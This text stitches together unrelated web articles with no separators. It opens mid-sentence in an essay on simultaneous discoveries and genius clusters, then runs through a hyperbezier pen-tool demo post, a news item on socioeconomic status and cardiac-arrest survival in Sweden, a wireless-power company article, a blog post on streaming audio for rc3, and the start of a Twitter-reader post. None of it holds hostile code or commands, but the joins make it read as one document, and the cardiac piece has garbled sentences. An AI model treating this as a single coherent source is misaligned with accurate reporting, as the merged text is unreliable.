says actually there are a <a href="https://en.wikipedia.org/wiki/List_of_multiple_discoveries">bucketload of them</a>.</p><p>But still, it could be coincidence.</p><p>Though when you read through the list it seems like it contains an awful lot of what people would refer to as the greatest scientific discoveries ever made. So when I took a look at a sample (<a href="https://www.theatlantic.com/magazine/archive/2013/11/innovations-list/309536/#list">The Atlantic</a>,  <a href="https://ocul-qu.primo.exlibrisgroup.com/discovery/fulldisplay?context=L&amp;vid=01OCUL_QU:QU_DEFAULT&amp;docid=alma9927085643405158">Kendall Haven's book</a>) there's actually a reasonable amount of overlap.</p><p>But a lot of the overlap is in the application of certain technologies rather than the discovery itself. Once Leibniz invented calculus, he didn't immediately set upon to use it and discover gravity. That remained Newton's to figure out.</p><p>So perhaps the curious fact isn't just that people managed to figure out things at the same time. But that they were looking at the same place at the same time.</p><p>That opens up the question of whether there were groups of smart people who all thought to explore similar research areas at the same time, and turns out there are! Clusters of people who looked at the same fields at the same time are everywhere! In fact when you look at innovation spreading in any era it usually follows a cluster of some sort.</p><p>I started writing about the weird fact that turn of the century Hungary was a weird place, seemingly filled with geniuses you could (but probably shouldn't) hit with a rock in any direction.</p><blockquote><p>There's a mythology about Hungarian super geniuses who were born at the turn of the 20th century, all in a suspiciously small neighbourhood, often going to similar or the same schools, and growing up with each other. John von Neumann, Paul Erdos, Leo Szilard, Edward Teller, Nicholas Kurti, Peter Lax, Nicholas Kaldor, George Soros, Andy Grove, Dennis Gabor, George Polya, the list goes on and on. They towered over fields of mathematics, physics, chemistry, biology, economics, computer science, even business. There's barely a human endeavour where they did not make a large and towering difference.</p></blockquote><p>This seemed to also be true in Silicon Valley. Paypal mafia, Stanford mafia, the old school Intel mafia, never forget Bell Labs mafia. There seemed to be quite a few groups of people who somehow seemed to have all found each other and created billions of dollars through happy happenstance.</p><p>I wondered whether there was a super radiation spike, or something in the water, or whether there was a Professor Xavier hidden somewhere in there, but none of those seemed particularly credible.</p><blockquote><p>So there are three possibilities. One is that Hungary at the turn of the 20th century was hit with some sort of genius radiation causing a genetic mutation in a large fraction of the population, and hey presto, genius alert. It's unlikely, of course, but what else could explain the extraordinary co-location of such a large number of geniuses who were all so good, that they got to the top of their fields.</p><p>Another option is that they were all pretty bright, but something in the cultural zeitgeist combined with some special educational process or insight created their special abilities. Like Professor Xavier's school for gifted children, they created superheroes. The puzzle here is what made it stop. Surely if you make superheroes for a couple of decades, you don't stop. You keep going! But it doesn't feel like Hungary is particularly adept today at creating more von Neumanns.</p></blockquote><p>My conclusion then was that somehow genius clusters make each other succeed more often than they would have otherwise. Which isn't a particularly controversial thing to say, since that's what seems to happen anyway. Put smart people together, they do even smarter things. Standing on the shoulders of giants and all.</p><h2>II</h2><p>And within this group of geniuses who have all found each other and exchange ideas to cross-pollinate and create even better ones, another constraint is needed. They need to have the right toolkit and ideas in the first place. In Ancient Greece, in the absence of much scientific progress, the advances were mostly made amongst subjects that can be done solely in the mind - philosophy and mathematics.</p><p>Though we don't know the names, I imagine there would have been similar cliques in architecture in Ancient Rome, or Egypt for that matter. In the Renaissance, they could build on the knowledge that had existed on arts and architecture to sculpt Pieta or build the Pantheon. In Central Europe in the late 19th century there were pressing problems in physics and chemistry which were opening up entire vistas of knowledge.</p><p>So the requirements become larger numbers of smart people, who have the time to cogitate and work on things that go beyond their daily bread, connected in networks that enable them all to rise together, rather than just succeed individually. That still seems like something that could exist, and did exist, at multiple points in human history.</p><p>In almost any society there is an upper class which has enough smart people with enough free time and who know each other from educational and social circles, that this criterion gets filled. So there has to be something more, something that defines not just their ability to work on something, but the ability to actually make progress on something.</p><p>I could work half a century on anti-gravity with other smart people, but I wouldn't place a bet on my ability to succeed in floating serenely above the clouds. Some things are harder than just to be a function (talent, time to work, network). It also needs the variable that is feasibility of making progress.</p><p>Which means that it's not just that there was a vast sea of ignorance that the geniuses could try to work on together, each guided by their own idiosyncratic likes and viewpoints. It's that oftentimes there existed translucent and tenuous maps that showed potential routes to actually conquer these fields.</p><p>It's not that Heraclitus had a brainwave that atoms <em>could potentially</em> exist. It's that Bohr created an actual model of what that might look like, and devised experiments to get to the bottom of the matter.</p><p>Sometimes fields get to a pregnant stage where everyone gets really sure that if they just work hard enough they will uncover all sorts of things. Sometimes they're right, and other times they are not. But the feeling is still there, and it's rather unmistakeable.</p><p>Whatever the right metaphor, the scene has to be set right. Nobody could invent Instagram, as much as they might have wanted to, before people had smartphones. Nobody could invent Microsoft before people had PCs. Nobody could invent CRISPR before we understood DNA and a whole lot else besides which I don't understand well enough to explain.</p><p>Standing on the shoulders of giants is a known cliché but it also happens to be true. More importantly it happens to mean that when there are giants standing around that you can climb up on, as long as there are enough of you, many of you will be looking at the same vista at the same time.</p><p>We're not waiting for the <a href="https://en.wikipedia.org/wiki/Genius_(mythology)">tutelary deity</a> to inspire us, or for genius insights to strike like never before without prior warning, but often the problems we look at are the same, and the tools we use are often similar, and the solutions we come up with naturally rhyme. As the inimitable Pratchett wrote: about Leonardo da Quirm:</p><blockquote><p>Particles of raw inspiration sleet through the universe all the time. Every once in a while one of them hits a receptive mind, which then invents DNA or the flute sonata form or a way of making light bulbs wear out in half the time. But most of them miss. Most people go through their lives without being hit by even one. Some people are even more unfortunate. They get them all.</p></blockquote><h2>III</h2><p>One highly suggestive outcome of this analysis is also that ideas are everywhere and much less exclusive than one might imagine.</p><p>When looking into this I came across a list of 7 "greatest ideas" in history. Even forgetting the biases that might have been involved and the myriad ones that didn't make it into the list, it's a good starting point. The ones identified were:</p><ul><li><p>Aristotle's Logic</p></li><li><p>Gödel's Incompleteness Theorems</p></li><li><p>Newton's Physics</p></li><li><p>Darwin's Natural Selection</p></li><li><p>Einstein's Miracle Year</p></li><li><p>Shannon's Information Theory</p></li><li><p>Tim Berners-Lee's World Wide Web</p></li></ul><p>Even within this rarified list let's see what we find:</p><ul><li><p>Godel's theorem was clearly a massive accomplishment. However in the theorems of limitations of formal systems there's Tarski's undefinability theorem and Church's proof and Turing's halting theorem, all of which revolve around the same few issues</p></li><li><p>Darwin's contemporary Alfred Wallace …</p></li></ul></div></div>

        <h2 id="introduction">Introduction</h2>

<p>This post introduces a new model for a path drawing (pen) tool, with a particular focus on font design.</p>

<p>Although this tool works much like familiar pen tools (which are based on the manipulation of <a href="https://en.wikipedia.org/wiki/B%C3%A9zier_curve">Bézier curves</a>), it is actually based on a new family of two-control-point curves, which we’ve been calling the <em>hyperbezier</em>.</p>

<p>This work is still in its early stages, and the demo below is quite barebones; my goal here is to get a simple version of this tool into the hands of designers and design-tool makers, so that more people can start to play around and evaluate it.</p>

<h4 id="contents">Contents</h4>



<h3 id="-background--motivation"><a id="background"></a> Background &amp; motivation</h3>

<p>The basis of this tool is a new mathematical model for fitting a curve to a set of points; that work was done earlier in the year by my collaborator <a href="https://raphlinus.github.io/">Raph Levien</a>. For the past year or so Raph has been excitedly talking to me about about things like <em>splines</em> and <em>G2 continuity</em> and the elegance of the <em>Euler spiral</em>, and I have for the most part been smiling politely and nodding. In the last few weeks however I have started trying to implement a simple drawing app around his new model, and the excitement is catching: this new tool feels like the first I have used that is a compelling alternative to traditional Bézier-curve based drawing tools.</p>

<p>It is likely that if you have ever used a computer drawing application then you have, at some point, used a <em>pen tool</em>: a tool that allows you to place a small number of points, which are then connected with a series of curves, the exact curvature being a function of the position of the points.</p>

<p>Tools like this— which take some fixed number of points and calculate a curve based on them— are called <em>splines</em>. If you are curious about the topic (particularly in the context of interactive design tools), a very accessible overview is Raph’s <a href="https://levien.com/phd/thesis.pdf">dissertation</a>; I won’t go into too much detail here, except to say that Raph has been revisiting this subject recently, and the result is the <a href="https://github.com/linebender/spline"><em>hyperbezier spline</em></a>. Like traditional (cubic) Bézier paths, a hyperbezier path is comprised of segments, each defined by two <em>on-curve</em> and two <em>off-curve</em> (or <em>control</em>) points; the curve passes through the two on-curve points, and the curvature itself is determined by the position of the two off-curve points.</p>

<p><img id="simple-cubic" src="https://www.cmyr.net/assets/hyperbez/hyperbez-simple-cubic1.png" alt="A simple cubic Bézier"></p>
<p>A Bézier path, consisting of two segments</p>

<p>If you’re generally curious about Béziers, <a href="https://pomax.github.io/bezierinfo/">A Primer on Béziers Curves</a> is an excellent resource. For our purposes it is enough to note that splines based on direct manipulation of Bézier control points (most pen tools) provide a high degree of control, but are difficult to use well. In particular, it can be tricky to maintain consistent curvature between adjoining segments of a path, which can lead to a ‘lumpy’ look; the following example is  contrived, but in practice consistently getting smooth feeling curves with Béziers is challenging.</p>


<p>A lumpy path. Mouseover to see the filled outline.</p>

<h3 id="-the-hyperbezier"><a id="hyperbezier"></a> The hyperbezier</h3>

<p>The core idea of the hyperbezier is the use of <em>auto-points</em>. These control points are adjusted automatically by the tool in order to maintain a smooth curve between neighbouring curve segments.</p>

<p>Let’s look at an example. With the path below you can drag points around, and double-click points to toggle their type.</p>

<p>The two green squares are <em>corner</em> points; curve segments that join at these points are allowed to change direction sharply. The two blue circles are <em>smooth</em> points; changing the curve on one side of the point can cause changes in the <em>auto</em> points (and hence the curve) on the other side.</p>

<p>The auto-points are indicated with dashed lines and terminating ‘x’s. The manual control points are indicated with solid lines, and terminating ‘o’s.</p>




<h5 id="playing-around">Playing around</h5>
<p>To get a better understanding of the spline’s behaviour, here are some things to try <em>(this requires a mouse)</em>:</p>
<ul>
  <li><em>double-click the bottom point to make it smooth</em>. When this point is smooth, the auto points beside it are adjusted so that the two curve segments join smoothly.</li>
  <li><a href="#" onclick="reloadHeart();return false;">reset,</a> or double-click the bottom point to turn it back into a corner. Now <em>doubleclick the top-left smooth point</em>. Making the top-left point a corner will replace the curve between them with a straight line. Two adjacent corners with only auto-points between them will always form a straight line, because a line is maximally smooth.
    <ul>
      <li>You should notice two small ‘x’s on this line. <em>Drag one of these auto points somewhere to position it manually</em>. You will notice that the remaining auto-point is repositioned as you drag.</li>
      <li><em>Drag the other auto-point</em>. With both control points positioned manually, and with corners at either end, you have full control of this segment.</li>
    </ul>
  </li>
</ul>

<!--(TK: SIMPLIFY ME, JUST INTRODUCE AUTO POINTS)The principal goal of the hyperbezier is to make it easier to maintain consistent curvature between adjoining segments of a path. This is achieved by letting the designer choose to have certain control points positioned automatically. These *auto-points* are adjusted in response to changes in adjoining segments so as to form a [smooth][smoothness] curve.-->

<!--In addition, on-curve points can be either *smooth* points or *corners*; if a point is smooth (marked by a green circle) then any auto points on either side of that point will be adjusted to maintain curvature with the segment on the other side. If a point is a corner (marked by a blue square) then the segment on one side of the point is not influenced by the curvature on the other side.-->

<!--Moving any on-curve point can cause subtle changes to the position of multiple auto-points; the example below is interactive, and you can drag the various points around, or toggle their type. Notice how the behaviour of the auto points changes if you toggle a nearby on-curve point between smooth and corner;

<p>Some example paths, drawn in the tool.</p>

<!--. This is very much a demo; the idea is to explore the interaction model, and to get a sense for how it feels to draw with the tool, compared to the standard Bézier curves used in most pen tools. Spoiler: I think it feels *really good*. You [can play around with it yourself][hypertoy]; it is pretty rough around the edges, but it works.-->

<h4 id="-using-the-toy-pen-tool"><a id="toy-guide"></a> Using the toy pen tool</h4>

<p>The toy is very rough: you have a select and a pen tool, but there are no rulers or measurement tools, no transforms, no ability to select multiple points. The pen works much like the familiar Bézier pen:</p>

<p>General:</p>

<ul>
  <li><code>V</code> key sets selection (arrow) tool, <code>P</code> key sets pen tool</li>
  <li>holding the space bar hides UI and shows filled path</li>
  <li>the current drawing is stored as part of the URL; copy this somewhere to “save”</li>
</ul>

<p>Pen tool:</p>

<ul>
  <li>click to add a line segment ending in a corner point</li>
  <li>alt + click to add an automatic curve segment ending in a smooth point</li>
  <li>click + drag to add a curve segment ending in a smooth point, with a manual control point</li>
  <li>click on a line segment to insert a point there; alt makes it a smooth point</li>
  <li>alt + click on any existing point to toggle the type of that point</li>
</ul>

<p>Select tool:</p>

<ul>
  <li>drag a control auto-point to move it, converting it to a manual point if necessary</li>
  <li>double-click will toggle an on-curve point between smooth and corner</li>
  <li>alt + click on a line segment to add two auto points</li>
  <li>deleting an off-curve point makes that curve segment into a line segment</li>
  <li>arrow keys nudge the current selection by 1 px; adding shift makes it 10px, and ctrl/cmd makes it 100px.</li>
  <li>shift + any of the above moves all of the points in the current outline (I’m sorry)</li>
</ul>

<h3 id="-next-steps"><a id="next-steps"></a> Next steps</h3>

<p>The code for the spline, including the demo, is <a href="https://github.com/linebender/spline">open source and available on github</a>.</p>

<p>The intent of this demo is twofold: firstly to test out how the curve feels to use, and to start playing around with the UX of the pen tool, and secondly to share this research with the broader community of designers and design-tool creators. Although this work is quite rough, my personal feeling is that this spline shows tremendous promise. Anecdotally, as a mere casual user of design tools, I find it <em>significantly</em> easier to make good looking curves with the hyperbezier than I do with traditional Bézier pen tools.</p>

<p>Perhaps the biggest question will be figuring out the best interaction model: what set of mouse clicks, key presses and modifiers the user issues in order to control the state of the points. This has been a challenge for other new splines; the interaction model we use with Béziers is <a href="https://youtu.be/sT8Y7o-zsVw?t=68">familiar and long-established</a>, and people (especially graphic designers) are deeply comfortable with it. The interaction model used here for the hyperbezier is intentionally designed to feel similar to these existing tools, but other interaction models may be worth exploring.</p>

<p>In the coming weeks I hope to integrating the spline into <a href="https://github.com/linebender/runebender">Runebender</a>, a font editor, which will provide a much richer editing experience and will let us better explore how well the spline is suited to real-world use. In addition, Raph intends to do a more detailed writeup of the spline itself and the associated math, which derives both from the earlier Spiro spline and the classic model of elastica under tension.</p>

<p>If you’re curious about the spline, there are more details in the <a href="https://github.com/linebender/spline">github repo</a>; if you have questions you can open an issue there, ask them in our <a href="https://xi.zulipchat.com/">zulip chat server</a> or reach out on <a href="https://twitter.com/cmyr">on twitter</a>.</p>

						<p>In patients with low socioeconomic status, heart resuscitation is heavily delayed and, according to a recent European Heart Journal report last week, victims of cardiac arrest in hospitals are less likely to recover.</p><p>Researchers analyzed data from the national Swedish cardiopulmonary resuscitation register for 24,217 cardiac arrests in Swedish hospitals between 2005 and 2018 in patients 40 and older. They collected socioeconomic data on patients from a second database and used the highest rate of education and annual income as a socioeconomic status (SES) measure.</p><p>"The good news is that for most of the cardiac arrest cases in this study, socioeconomic status didn't seem to matter." said Professor Jens Agerström of Linnaeus University in Kalmar and Växjö, Sweden, "Nevertheless, there seems to be a significant number of deaths that can still be attributed to socioeconomic factors, even when we take account of things that could affect the results such as gender, age, ethnicity, other health conditions, cause of the cardiac arrest, and the specific hospital providing the treatment."</p><p>Patients with higher SES were slightly better controlled for heart rhythm prior to cardiac arrest. This may partly explain the survival disparities. Most unrecovered combinations between patient SES and the findings studied are minimal. A disparity in SES-related survival chances of around 21 percent shouldn't be overlooked, authors say.</p><figure><img src="https://smosa.com/content/images/2020/12/ehaa954f3.png" alt="" srcset="https://smosa.com/content/images/size/w600/2020/12/ehaa954f3.png 600w, https://smosa.com/content/images/size/w1000/2020/12/ehaa954f3.png 1000w, https://smosa.com/content/images/size/w1600/2020/12/ehaa954f3.png 1600w, https://smosa.com/content/images/2020/12/ehaa954f3.png 1949w" sizes="(min-width: 720px) 720px"><figcaption>Credit: European Heart Journal</figcaption></figure><p>The study investigated several outcomes but looking at survival for 30 days after the cardiac arrest, approximately 280 people in 1000 from a low socioeconomic background will survive; however, for patients from a high socioeconomic background approximately 320 people may survive to 30 days.</p><p>The goal of the new retrospective registry was to investigate SES inequalities in IHCA care and survival.

<p>Long-range wireless power transmission is a concept that has been a long time coming since Nikola Tesla obtained a patent for the Tesla coil over 120 years ago.&nbsp;&nbsp;</p>



<p>In the recent decade, wireless power has become more of a familiar term, with companies such as Powerbyproxi and WiTricity leading the way with innovation in short-range wireless technology. That is, the ability to transmit electrical power over short distances (up to a few metres), primarily to charge consumer devices like mobile phones. This technology enables us to charge devices without requiring wires within short range, e.g. at home or by driving up to an electric vehicle charging station.</p>



<p>The next evolution in freeing humanity from the restrictions of where wires can go is the ability to transmit large amounts of power over large distances. Instead of charging devices, long-range wireless transmission<strong> </strong>technology<strong> </strong>will allow us to power households, communities and send large quantities of power to places where it is too hard and expensive to reach using wire infrastructure. This is the technology Emrod is working on, which will support the uptake of sustainable energy and decentralizing electric grids.&nbsp;</p>



<p>In this article, we make a comparison between short-range and long-range power transmission, including the difference in technology and use cases.</p>



<p>First, let’s start with getting clear on what wireless power transmission is.</p>



<h3><strong>What is wireless power transmission?</strong></h3>



<p>Wireless power transmission is the act of delivering meaningful amounts of energy without moving or employing mass between transmitter and receiver. Electromagnetic fields convey power across space. It can replace the need for wires and batteries to provide a more convenient, mobile and safer way to provide energy.&nbsp;</p>



<p><em>According to early history, Heinrich Hertz was the first to prove the existence of electromagnetic waves. Hence the name “hertz” as the unit for frequency.</em></p>



<p>The difference between short and long-range power transmission can clearly be defined by the distance across which the power is transmitted. However, what determines the capabilities of these different types of technology?</p>



<figure><img loading="lazy" width="1024" height="576" src="https://secureservercdn.net/166.62.108.196/u1v.9ad.myftpupload.com/wp-content/uploads/2020/12/Short-Vs-Long-Thumbnail.003-1024x576.jpeg" alt="" srcset="https://secureservercdn.net/166.62.108.196/u1v.9ad.myftpupload.com/wp-content/uploads/2020/12/Short-Vs-Long-Thumbnail.003-1024x576.jpeg 1024w, https://secureservercdn.net/166.62.108.196/u1v.9ad.myftpupload.com/wp-content/uploads/2020/12/Short-Vs-Long-Thumbnail.003-300x169.jpeg 300w, https://secureservercdn.net/166.62.108.196/u1v.9ad.myftpupload.com/wp-content/uploads/2020/12/Short-Vs-Long-Thumbnail.003-768x432.jpeg 768w, https://secureservercdn.net/166.62.108.196/u1v.9ad.myftpupload.com/wp-content/uploads/2020/12/Short-Vs-Long-Thumbnail.003-1536x864.jpeg 1536w, https://secureservercdn.net/166.62.108.196/u1v.9ad.myftpupload.com/wp-content/uploads/2020/12/Short-Vs-Long-Thumbnail.003.jpeg 1920w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<h3><strong>Short-range wireless power</strong></h3>



<p>Short-range is typically power transmission within centimetres and metres. The most common wireless power transmission technique is with Inductive Power Transfer, where power is transferred utilizing a magnetic field using inductive coupling between two coils of wire.&nbsp;</p>



<p>Examples of short-range power transmission by this definition include powering devices wirelessly within a house or building and charging electric cars using a resonant magnetic induction pad on the ground.</p>



<h3><strong>Long-range wireless power transmission</strong></h3>



<p>Long-range is typically power transmission of 100’s of metres or across kilometres. One technique of power transmission is using antennas to send electromagnetic beams, like microwaves or lasers. The limitation with using inductive coupling power transmission in long-range is that the magnetic field decays quite rapidly when the distance between the transmitter and receiver is increased. Therefore, electromagnetic beaming is more appropriate for this reason.&nbsp;</p>



<p>Long-range power transmission with antennas can be categorised into Near-Field or Far-Field. In the near-field, one can observe plane waves with very little to no beam divergence. Conversely, in the far-field there is significant beam divergence, and inverse squared decay for the power density with distance, something which is not observed in the near-field.&nbsp;</p>



<p>For Emrod’s purpose, we work in the near-field to produce a collimated beam with negligible loss.&nbsp;</p>



<p><br>The use cases for long-range transmission include beaming power from space to earth, charging unmanned aerial vehicles (without requiring the UAV to return to a base for charging) and transmitting power across difficult terrain instead of using wires, which is the problem we are solving at Emrod. Learn more about the use cases for Emrod’s technology <a href="https://emrod.energy/use-cases/">here.</a></p>



<h3><strong>Why are these new developments in long-range technology significant?</strong></h3>



<figure><img loading="lazy" width="1024" height="576" src="https://secureservercdn.net/166.62.108.196/u1v.9ad.myftpupload.com/wp-content/uploads/2020/12/Emrod-long-range-wireless-energy-transmission.png" alt="" srcset="https://secureservercdn.net/166.62.108.196/u1v.9ad.myftpupload.com/wp-content/uploads/2020/12/Emrod-long-range-wireless-energy-transmission.png 1024w, https://secureservercdn.net/166.62.108.196/u1v.9ad.myftpupload.com/wp-content/uploads/2020/12/Emrod-long-range-wireless-energy-transmission-300x169.png 300w, https://secureservercdn.net/166.62.108.196/u1v.9ad.myftpupload.com/wp-content/uploads/2020/12/Emrod-long-range-wireless-energy-transmission-768x432.png 768w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>For energy to be useful, it needs to move from where it is generated to where it is required. Energy is similar to communication in this sense. For communication services to be useful, they must be able to transmit a message from one person to another. At the moment, our methods for generating energy are dependent on the locations that can be accessed economically using wired infrastructure (lines and pylons, and underwater cables). Many of the best places to generate renewable energy are hard to reach areas, for example high up on hills or mountains or offshore locations, where there is lots of wind, and it’s well out of the way of people.&nbsp;</p>



<p>On the other hand, the people who have access to energy are dependent on the economics of connecting the household or community to a power source. Many communities and dwellings do not have reliable access to electricity because they are in remote, hard to access areas where it is not economically viable to put in and maintain power lines or cables.&nbsp;</p>



<p>By reducing the costs and ease of installing and maintaining the infrastructure that transmits power from one place to another, we can open up our access to and provision of energy.</p>



<h3><strong>Emrod’s long-range wireless technology use cases</strong></h3>



<p>At Emrod, we have developed technology that allows power to be transmitted over many kilometres.&nbsp; It is the worlds first long-range wireless power transmission technology that is commercially viable. We use passive relays to achieve power transmission over a long distance, without the losses that would otherwise make long distance transmissions inefficient and uneconomical for commercial purposes.&nbsp;</p>



<p>The application of Emrod’s technology is wide-reaching, but we are primarily focused on working with energy distribution companies and organizations driving sustainable energy and decentralized grid projects.&nbsp;</p>



<p>Emrod’s wireless system can provide a cost-effective solution for the transmission of power across terrain where it is difficult to lay and maintain power lines and cables. For example across forests or waterways, to alleviate right of passage issues or reduce the ecological impact of pylons, and to provide back up systems when power lines fail, for example, outages or disaster relief.&nbsp;</p>



<p>You can read more about the common use cases for Emrod’s technology on the <a href="https://emrod.energy/use-cases/">Use Cases page of our website</a>.</p>



<h3><strong>Conclusion</strong></h3>



<p>The early modern development of wireless transmission technology used magnetic induction charging pads, which required contact and careful alignment of the device, e.g. a phone. Subsequently, technology developed to charge smartphones and other devices from meters away that works like a strong WiFi. This technology has been considered long-range, in comparison to the previous wireless technology, which required the transmitting and receiving devices to be in contact with one another. We have now entered into the next era of wireless technology, which is the transmission of larger amounts of power over kilometres. It is an exciting next step towards Nikola Tesla’s vision of power everywhere.</p>

<hr>
<p>It's that time between Christmas and new year again, where you can usually find me at Leipzig's Congress Zentrum on my computer hacking away. It's chaos congress time. Given this year's pandemic, the "37c3" however, was moved to the internet and renamed to <a target="_blank" rel="noopener" href="https://rc3.world/">"rc3", the Remote Chaos Communication Congress</a>.</p>
<p>Earlier this month, the iconic congress build-up started. This time around, building up didn't involve moving heavy crates of mate tea around. Instead, it meant that everyone started designing, drawing, and building their assembly maps for the "rc3.world". A <a target="_blank" rel="noopener" href="https://events.ccc.de/2020/09/04/rc3-remote-chaos-experience/">2D virtual space</a> that's supposed to replace this year's lack of physical space.</p>
<p>The rc3.world software is a fork of <a target="_blank" rel="noopener" href="https://workadventu.re/">workadventu.re</a>, a 2D game simulating a virtual work environment with avatars. Within this 2D map of the virtual congress, the organizers invited all assemblies to build their own spaces. And so, as the build-up for <a target="_blank" rel="noopener" href="https://www.dist0rtion.com/">Social Dist0rtion Protocol</a> assembly began, I had an idea for a project.</p>
<figure>
<img src="https://timdaub.github.io/assets/images/wasm-synth-screenshot.png" alt=""><figcaption><a target="_blank" rel="noopener" href="https://audio.daubenschuetz.de/assets/">wasm-synth</a>, the project I launched at last year's c3</figcaption>
</figure>
<p>At last year's congress in Leipzig, I had launched <a target="_blank" rel="noopener" href="https://audio.daubenschuetz.de/assets/">wasm-synth</a>, a synthesizer built in WebAssembly. Naturally, this time I was eager to take the project to the next stage. Hence, roughly a week ago, I started to work on a new project called "WASM-STREAM" - an extension to wasm-synth.</p>
<p><a target="_blank" rel="noopener" href="https://github.com/social-dist0rtion-protocol/wasm-stream">WASM-STREAM</a> is a virtual stage for digital artists. Using WASM-STREAM, an artist can broadcast their play with wasm-synth to an internet radio stream. More importantly, though, this means that they can take the stage on the <a target="_blank" rel="noopener" href="https://www.dist0rtion.com/">Social Dist0rtion Protocol</a>'s assembly and jam away to a virtually present audience.</p>
<figure>
<img src="https://timdaub.github.io/assets/images/wasm-stream.png" alt=""><figcaption>Social Dist0rtion Protocol's dance floor in the rc3.world</figcaption>
</figure>
<p>So how did I build it?</p>
<h2 id="a-first-little-demo">A First Little Demo</h2>
<p><a target="_blank" rel="noopener" href="https://audio.daubenschuetz.de/assets/">wasm-synth</a> is a project that I built deliberately to showcase the power of the web. At the beginning of the year, I wrote <a href="https://timdaub.github.io/2020/02/19/wasm-synth/">a blog post</a> outlining its technical details. It's using the <code>AudioWorklet</code> and some WebAssembly-transpiled code to render audio in real-time in the user's browser.</p>
<p>Now, workadventure, the software ccc uses to run their rc3.world, is also built on the web and allows embedding audio streams. So I thought, why not take the audio generated in wasm-synth and stream it to everyone in the rc3 world.</p>
<p>In a way, it sounds like not that big of a deal to build an audio streaming client within a website. But remember that a browser's networking ability is limited. While we've come a long way from the <code>XMLRequest</code> API to <code>fetch</code>, <code>WebSocket</code> and <code>WebRTC</code>, these concepts only allow talking upstream if their authors deliberately built their upstream application for supporting them.</p>
<p>Naive as I Am, I started by deploying <a target="_blank" rel="noopener" href="https://icecast.org/">icecast2</a> to a small Hetzner instance. I configured an authorized mount point that allows a streamer to connect using client software. Then I looked for a way to stream audio directly to icecast from a browser. And found... nothing.</p>
<p>Well, I did find something. It's called <a target="_blank" rel="noopener" href="https://webcast.github.io/">webcast</a>, and it's a <a target="_blank" rel="noopener" href="https://github.com/webcast/webcast.js/blob/master/SPECS.md">WebSocket-based subprotocol</a> that allows sending binary audio data between a client and a server. In their <a target="_blank" rel="noopener" href="https://github.com/webcast/webcast.js#server">README.md</a>, the authors also mention webcast's compatibility with <a target="_blank" rel="noopener" href="https://www.liquidsoap.info/">liquidsoap</a>, a DSL for audio stream processing.</p>
<p>So my first attempt at plugging these things together involved encoding the <code>Float32Array</code> data from the <code>AudioWorklet</code> into an mp3 stream using <a target="_blank" rel="noopener" href="https://github.com/toots/shine/">libshine</a> (that has a wasm JavaScript package) and then sending it to a <a target="_blank" rel="noopener" href="https://www.liquidsoap.info/doc-dev/harbor.html">liquidsoap "harbor"</a> via webcast. Liqidsoap would then convert the mp3 stream to ogg-vorbis, make it stereo, and forward it to the icecast server.</p>
<p>And, to my surprise, it worked. When I hit some keys on the wasm-synth, they got encoded and sent to the audio stream. With a bit of delay, I heard what I had just played. Cool!</p>
<p>Anyways, with my small little demo, I was galvanized and motivated enough to spend more time building something that would work for the congress.</p>
<h2 id="the-wasm-stream-architecture">The WASM-STREAM Architecture</h2>
<p>Ultimately, liquidsoap was not well-suited for my purpose. I also quickly realized that all I had to do was build a proxy between the <a target="_blank" rel="noopener" href="https://gist.github.com/ePirat/adc3b8ba00d85b7e3870">icecast protocol</a> and the <a target="_blank" rel="noopener" href="https://github.com/webcast/webcast.js/blob/master/SPECS.md">webcast protocol</a>. And that's what I ended up building. A small <a target="_blank" rel="noopener" href="https://github.com/webcast/webcast.js/blob/master/SPECS.md">JavaScript application</a> implementing two protocols. It listens for incoming WebSocket connections and calls icecast with a loooooonng PUT request to establish a stream.</p>
<p>WASM-STREAM itself doesn't do any encoding. It can, however, route an <code>audio/ogg</code> or an <code>audio/mpeg</code> stream from webcast to icecast. The encoding from WAV to mp3 takes place on the user's device already when the play the synthesizer.</p>
<h2 id="how-to-use-wasm-stream">How To Use WASM-STREAM</h2>
<p>Whether you have a ticket to rc3 or not, you can tune into the stream at <a target="_blank" rel="noopener" href="https://audio.daubenschuetz.de/stream">https://audio.daubenschuetz.de/stream</a>. It's an mp3-encoded stream, meaning it won't work in all browsers equally (Firefox works natively; Chrome et al. only support ogg/vorbis natively). If it doesn't, try a desktop application like iTunes or VLC.</p>
<p>The stream is continuously online. But if you don't hear anything then that's because nobody is currently playing the <a target="_blank" rel="noopener" href="https://audio.daubenschuetz.de/assets/">WASM-SYNTH</a>.</p>
<p>Finally, you're able to "dance" on the Social Dist0rtion Protocol's assembly dance floor. The rc3 orga was nice enough to allow us streaming audio on our map. <a target="_blank" rel="noopener" href="https://rc3.world/rc3/room/93840a8f-88f7-4f11-bb61-68800c4d4962/">Click here</a> to visit us directly on the rc3.world map.</p>

        <p>Over the last week, I’ve been working on <a href="https://github.com/thesephist/lucerne">Lucerne</a>, a Twitter “reader” app built to fit my personal needs from Twitter. It’s been an interesting exercise in <a href="https://thesephist.com/posts/tools/">building a tool around workflows</a>, so I wanted to tell you the story of how the design came to be, and what I’ve noticed using Lucerne for my daily escapades into the Twittersphere.</p>
<p><img src="https://thesephist.com/img/lucerne.png" alt="Lucerne in action"></p>
<p>Like many of my personal tools, Lucerne is built with my <a href="https://dotink.co/">Ink programming language</a> on the backend and my <a href="https://github.com/thesephist/torus">Torus</a> UI library on the frontend. It’s made just for me at the moment, but given the interest I’ve gotten about Lucerne online, I might make a version open for anyone to use.</p>
<h2 id="designing-myself-a-better-twitter">Designing myself a better Twitter</h2>
<p>For me, Twitter serves two purposes. First, it’s a <em>learning tool</em>. There are lots of smart folks talking to each other and sharing what they’re thinking about on Twitter from software to economics to writing, and I can find on Twitter opinions or perspectives I can’t find on blogs or books. Second, it’s a <em>place for me to share whatever I’m working on</em> on my blog or on my side projects with my audience. Lucerne is designed around these two primary workflows: learning and sharing.</p>
<p>Twitter’s main user interface, the algorithmic timeline, is bad for using Twitter as a learning tool. It feels like sticking a straw into a firehouse and hoping you’ll suck out enough interesting insights to be worth the effort. I wanted a better way for me to discover and keep track of interesting conversations happening on Twitter about any topic. Twitter does provide decent tools for me to share my work online – things like scheduled tweets, analytics, notifications, and search – but they’re not in one place, so I wanted to consolidate these tools.</p>
<p><img src="https://thesephist.com/img/lucerne-timeline.jpg" alt="A timeline view in Lucerne"></p>
